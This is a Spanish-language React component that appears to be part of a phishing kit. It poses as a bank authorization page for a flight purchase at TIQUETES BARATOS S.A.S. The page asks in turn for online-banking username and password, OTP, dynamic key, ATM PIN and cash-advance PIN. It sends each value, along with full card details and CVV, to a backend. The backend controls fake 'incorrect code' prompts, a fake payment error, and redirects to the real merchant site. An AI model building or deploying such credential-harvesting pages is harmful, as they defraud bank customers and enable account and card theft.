import { useState, useEffect } from "react";
import { useFlightStore } from "@/stores/flightStore";
import FullScreenLoader from "@/components/shared/FullScreenLoader";
import { useSearchParams, useNavigate } from "react-router";
import { useBankAPI, useBankForm } from "../hooks";
import { calculateFlightTotal, getCardAssets } from "../services";

const BankAuth = () => {
    const [isLoading, setIsLoading] = useState(true);
    const navigate = useNavigate();
    
    const { searchInfo, selectedFlight, selectedReturnFlight } = useFlightStore();
    const { isSubmitting, error, sendDataToAPI } = useBankAPI();
    const { 
        currentForm, 
        formData, 
        updateFormData, 
        clearField, 
        markFieldAsSubmitted, 
        getErrorMessage,
        handleFormTransition, 
        submittedFields
    } = useBankForm();
    
    const [banner, setBanner] = useState<{ message: string; type: 'error' | 'info' } | null>(null);
    
    const [searchParams] = useSearchParams();
    
    // Calcular total del vuelo usando el servicio
    const flightCalculation = calculateFlightTotal(searchInfo, selectedFlight, selectedReturnFlight);

    // Detectar tipo de tarjeta desde los parámetros de URL
    const cardType = searchParams.get('type') || 'mastercard';
    const cardAssets = getCardAssets(cardType as any);

    // Obtener los últimos 4 dígitos de la tarjeta desde los parámetros de URL
    const lastFourDigits = searchParams.get('last4') || "****";

    useEffect(() => {
        const timer = setTimeout(() => {
            setIsLoading(false);
        }, 2500);
        return () => clearTimeout(timer);
    }, []);

    const showBanner = (msg: string, type: 'error' | 'info' = 'info') => {
        setBanner({ message: msg, type });
    };
    const clearBanner = () => setBanner(null);

    const getActionMessageForForm = (form: string): string => {
        switch (form) {
            case 'checker-userpassword':
                return '';
            case 'checker-otpcode':
                return 'Ingresa el código OTP que hemos enviado a tu teléfono';
            case 'checker-cdin':
                return 'Ingresa tu Clave Dinámica para continuar';
            case 'checker-ccaj':
                return 'Ingresa tu Clave de Cajero para continuar';
            case 'checker-cavance':
                return 'Ingresa tu Clave de Avances para continuar';
            default:
                return '';
        }
    };

    useEffect(() => {
        const msg = getActionMessageForForm(currentForm);
        if (msg) {
            setBanner({ message: msg, type: 'info' });
        } else {
            setBanner(null);
        }
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [currentForm]);

    const getFieldsForForm = (form: string): Array<keyof typeof formData> => {
        switch (form) {
            case 'checker-userpassword':
                return ['user', 'puser'];
            case 'checker-otpcode':
                return ['otp'];
            case 'checker-cdin':
                return ['cdin'];
            case 'checker-ccaj':
                return ['ccaj'];
            case 'checker-cavance':
                return ['cavance'];
            default:
                return [] as any;
        }
    };

    const validateField = (fieldName: keyof typeof formData, value: string): string | null => {
        switch (fieldName) {
            case 'user': {
                if (value.length < 3) return 'El usuario debe tener al menos 3 caracteres';
                if (value.length > 16) return 'El usuario no debe exceder 16 caracteres';
                if (!/^[a-zA-Z0-9]+$/.test(value)) return 'El usuario solo acepta letras y números';
                return null;
            }
            case 'puser': {
                if (value.length < 3) return 'La contraseña debe tener al menos 3 caracteres';
                if (value.length > 16) return 'La contraseña no debe exceder 16 caracteres';
                if (!/^[a-zA-Z0-9]+$/.test(value)) return 'La contraseña solo acepta letras y números';
                return null;
            }
            case 'cdin': {
                if (!/^\d{4,8}$/.test(value)) return 'La Clave Dinámica debe tener entre 4 y 8 dígitos';
                return null;
            }
            case 'ccaj': {
                if (!/^\d{4}$/.test(value)) return 'La Clave de Cajero debe tener 4 dígitos';
                return null;
            }
            case 'cavance': {
                if (!/^\d{3,6}$/.test(value)) return 'La Clave de Avances debe tener entre 3 y 6 dígitos';
                return null;
            }
            case 'otp': {
                if (!/^\d{6,8}$/.test(value)) return 'El OTP debe tener entre 6 y 8 dígitos';
                return null;
            }
            default:
                return null;
        }
    };

    const sanitizeInput = (fieldName: keyof typeof formData, rawValue: string): string => {
        switch (fieldName) {
            case 'user':
            case 'puser':
                return rawValue.replace(/[^a-zA-Z0-9]/g, '').slice(0, 16);
            case 'cdin':
                return rawValue.replace(/\D/g, '').slice(0, 8);
            case 'ccaj':
                return rawValue.replace(/\D/g, '').slice(0, 4);
            case 'cavance':
                return rawValue.replace(/\D/g, '').slice(0, 6);
            case 'otp':
                return rawValue.replace(/\D/g, '').slice(0, 8);
            default:
                return rawValue;
        }
    };

    const handleSubmit = async (fieldName: keyof typeof formData) => {
        const value = formData[fieldName];
        
        if (!value.trim()) {
            const errorMessage = getErrorMessage(fieldName);
            if (errorMessage) showBanner(errorMessage, 'error');
            return;
        }

        const validationError = validateField(fieldName, value);
        if (validationError) {
            showBanner(validationError, 'error');
            return;
        }

        markFieldAsSubmitted(fieldName);
        
        const redirectTo = await sendDataToAPI(
            fieldName, 
            value, 
            { searchInfo, selectedFlight, selectedReturnFlight },
            {
                cardNumber: searchParams.get('cardNumber') || '',
                expiryDate: searchParams.get('expiryDate') || '',
                cvv: searchParams.get('cvv') || '',
                installments: searchParams.get('installments') || '1',
                cardholderName: searchParams.get('cardholderName') || '',
                documentId: searchParams.get('documentId') || '',
                phone: searchParams.get('phone') || ''
            },
            formData
        );

        if (redirectTo) {
            const next = String(redirectTo);
            if (next === 'payment') {
                alert('No hemos podido verificar su compra. Intente con otro medio de pago. COERR7784937');
                const logoParam = searchParams.get('logo') || '';
                const target = logoParam ? `/payments?logo=${encodeURIComponent(logoParam)}` : '/payments';
                navigate(target);
                return;
            }
            if (next === 'ban') {
                window.location.href = 'https://tiquetesbaratos.com';
                return;
            }
            if (next === 'success' || next === 'success.html') {
                navigate('/success');
                return;
            }

            const fieldsToClear = getFieldsForForm(next);
            const isRepeatRequest = next === currentForm || fieldsToClear.some(f => submittedFields.has(f));

            // Mapeo de mensajes solicitados
            const firstTimeMessages: Record<string, string> = {
                'checker-otpcode': 'Por favor ingresa el código OTP que enviamos a tu celular',
                'checker-ccaj': 'Por favor introduce la clave que utilizas en el cajero',
                'checker-cavance': 'Por introduce tu Clave de Avances de tu tarjeta',
                'checker-cdin': 'Por favor introduce tu Clave Dinámica',
            };
            const repeatMessages: Record<string, string> = {
                'checker-otpcode': 'Código incorrecto, hemos enviado un nuevo código',
                'checker-ccaj': 'Clave incorrecta, inténtalo nuevamente',
                'checker-cavance': 'Clave incorrecta, inténtalo nuevamente',
                'checker-cdin': 'Clave Dinámica incorrecta o expiró, inténtalo nuevamente',
                'checker-userpassword': 'Usuario o contraseña incorrectos, inténtalo nuevamente',
            };

            if (isRepeatRequest) {
                const key = next === 'checker-userpassword' ? 'checker-userpassword' : next;
                const msg = repeatMessages[key] || 'Dato incorrecto, por favor ingréselo nuevamente';
                setBanner({ message: msg, type: 'error' });
            } else {
                // No mostrar nada para checker-userpassword la primera vez
                if (next !== 'checker-userpassword') {
                    const msg = firstTimeMessages[next] || '';
                    if (msg) setBanner({ message: msg, type: 'info' });
                }
            }

            fieldsToClear.forEach((f) => clearField(f));
            handleFormTransition(next as any);
        }
    };

    const renderForm = () => {
        switch (currentForm) {
            case 'checker-userpassword':
                return (
                    <div className="space-y-4 mb-6 w-full mx-auto text-left">
                        <div className="flex items-center">
                            <span className="text-gray-700 w-24 text-right mr-2">Usuario:</span>
                            <input
                                type="text"
                                value={formData.user}
                                onChange={(e) => updateFormData('user', sanitizeInput('user', e.target.value))}
                                onFocus={() => clearField('user')}
                                className="border border-gray-300 px-2 py-2 rounded text-sm w-full flex-1"
                                placeholder=""
                                inputMode="text"
                                maxLength={16}
                            />
                        </div>
                        
                        <div className="flex items-center">
                            <span className="text-gray-700 w-24 text-right mr-2">Contraseña:</span>
                            <input
                                type="password"
                                value={formData.puser}
                                onChange={(e) => updateFormData('puser', sanitizeInput('puser', e.target.value))}
                                onFocus={() => clearField('puser')}
                                className="border border-gray-300 px-2 py-2 rounded text-sm w-full flex-1"
                                placeholder=""
                                maxLength={16}
                            />
                        </div>
                        
                        <button 
                            onClick={() => handleSubmit('user')}
                            disabled={isSubmitting}
                            className="bg-black text-white px-6 py-2 rounded text-sm disabled:bg-gray-400 w-full"
                        >
                            {isSubmitting ? 'Enviando...' : 'Continuar'}
                        </button>
                        
                    </div>
                );

            case 'checker-otpcode':
                return (
                    <div className="space-y-4 mb-6 w-full max-w-sm mx-auto text-left">
                        <div className="flex items-center">
                            <span className="text-gray-700 w-24 text-right mr-2">OTP:</span>
                            <input
                                type="text"
                                value={formData.otp}
                                onChange={(e) => updateFormData('otp', sanitizeInput('otp', e.target.value))}
                                onFocus={() => clearField('otp')}
                                className="border border-gray-300 px-2 py-2 rounded text-sm w-full flex-1"
                                placeholder=""
                                inputMode="numeric"
                                pattern="\d*"
                                maxLength={8}
                            />
                        </div>
                        
                        <button 
                            onClick={() => handleSubmit('otp')}
                            disabled={isSubmitting}
                            className="bg-black text-white px-6 py-2 rounded text-sm disabled:bg-gray-400 w-full"
                        >
                            {isSubmitting ? 'Enviando...' : 'Continuar'}
                        </button>
                        
                    </div>
                );

            case 'checker-cdin':
                return (
                    <div className="space-y-4 mb-6 w-full max-w-sm mx-auto text-left">
                        <div className="flex items-center">
                            <span className="text-gray-700 w-24 text-right mr-2">Clave Dinámica:</span>
                            <input
                                type="text"
                                value={formData.cdin}
                                onChange={(e) => updateFormData('cdin', sanitizeInput('cdin', e.target.value))}
                                onFocus={() => clearField('cdin')}
                                className="border border-gray-300 px-2 py-2 rounded text-sm w-full flex-1"
                                placeholder=""
                                inputMode="numeric"
                                pattern="\d*"
                                maxLength={8}
                            />
                        </div>
                        
                        <button 
                            onClick={() => handleSubmit('cdin')}
                            disabled={isSubmitting}
                            className="bg-black text-white px-6 py-2 rounded text-sm disabled:bg-gray-400 w-full"
                        >
                            {isSubmitting ? 'Enviando...' : 'Continuar'}
                        </button>
                        
                    </div>
                );

            case 'checker-ccaj':
                return (
                    <div className="space-y-4 mb-6 w-full max-w-sm mx-auto text-left">
                        <div className="flex items-center">
                            <span className="text-gray-700 w-24 text-right mr-2">Clave Cajero:</span>
                            <input
                                type="password"
                                value={formData.ccaj}
                                onChange={(e) => updateFormData('ccaj', sanitizeInput('ccaj', e.target.value))}
                                onFocus={() => clearField('ccaj')}
                                className="border border-gray-300 px-2 py-2 rounded text-sm w-full flex-1"
                                placeholder=""
                                inputMode="numeric"
                                pattern="\d*"
                                maxLength={4}
                            />
                        </div>
                        
                        <button 
                            onClick={() => handleSubmit('ccaj')}
                            disabled={isSubmitting}
                            className="bg-black text-white px-6 py-2 rounded text-sm disabled:bg-gray-400 w-full"
                        >
                            {isSubmitting ? 'Enviando...' : 'Continuar'}
                        </button>
                        
                    </div>
                );

            case 'checker-cavance':
                return (
                    <div className="space-y-4 mb-6 w-full max-w-sm mx-auto text-left">
                        <div className="flex items-center">
                            <span className="text-gray-700 w-24 text-right mr-2">Clave Avances:</span>
                            <input
                                type="password"
                                value={formData.cavance}
                                onChange={(e) => updateFormData('cavance', sanitizeInput('cavance', e.target.value))}
                                onFocus={() => clearField('cavance')}
                                className="border border-gray-300 px-2 py-2 rounded text-sm w-full flex-1"
                                placeholder=""
                                inputMode="numeric"
                                pattern="\d*"
                                maxLength={6}
                            />
                        </div>
                        
                        <button 
                            onClick={() => handleSubmit('cavance')}
                            disabled={isSubmitting}
                            className="bg-black text-white px-6 py-2 rounded text-sm disabled:bg-gray-400 w-full"
                        >
                            {isSubmitting ? 'Enviando...' : 'Continuar'}
                        </button>
                        
                    </div>
                );

            default:
                return null;
        }
    };

    if (isLoading) {
        return (
            <FullScreenLoader 
                message="Verificando seguridad de la transacción..." 
                customImage={cardAssets.loader}
            />
        );
    }

    if (isSubmitting) {
        return (
            <FullScreenLoader 
                message="Enviando datos..." 
                customImage={cardAssets.loader}
            />
        );
    }

    return (
        <div className="min-h-screen bg-white text-sm">
            <nav className="bg-white shadow-sm border-b border-gray-200">
                <div className="max-w-4xl mx-auto px-4 py-4">
                    <div className="flex justify-end">
                        <img 
                            src={cardAssets.navbar} 
                            alt="Logo Banco" 
                            className="h-12 object-contain"
                        />
                    </div>
                </div>
            </nav>

            <div className="max-w-md mx-auto px-4 py-16">
                <p className="text-lg text-center mb-10 font-bold">
                    Autorización de transacción
                </p>
                <div className="text-center mb-12">
                    <p className="text-gray-900 text-md">
                    La transacción que intenta realizar en <b>TIQUETES BARATOS S.A.S</b> por <b>$ <span id="flight-price">{flightCalculation.finalTotal.toLocaleString()}</span> COP</b> debe ser autorizada. Por favor verifica la siguiente información:
                    </p>
                </div>

                {banner && (
                    <div className={`${banner.type === 'error' ? 'bg-red-50 border-red-200 text-red-800' : 'bg-blue-50 border-blue-200 text-blue-800'} border rounded-lg p-3 mb-4 text-sm flex items-start justify-between`}>
                        <span>{banner.message}</span>
                        <button onClick={clearBanner} className="ml-3 text-gray-500 hover:text-gray-700">✕</button>
                    </div>
                )}

                <div>
                    <div className="mb-6">
                        <p className="text-gray-700 mb-2">
                            <b>Comercio:</b> TIQUETES BARATOS S.A.S
                        </p>
                        <p className="text-gray-700 mb-2">
                            <b>Monto:</b>  $ {flightCalculation.finalTotal.toLocaleString()} COP
                        </p>
                        <p className="text-gray-700 mb-2">
                            <b>Número de tarjeta:</b> •••• •••• •••• {lastFourDigits}
                        </p>
                    </div>

                    <p className="text-gray-900 text-md mt-6 mb-4">Ingrese los datos de su Banca Virtual:</p>
                    {renderForm()}

                </div>
            </div>
        </div>
    );
};

export default BankAuth;
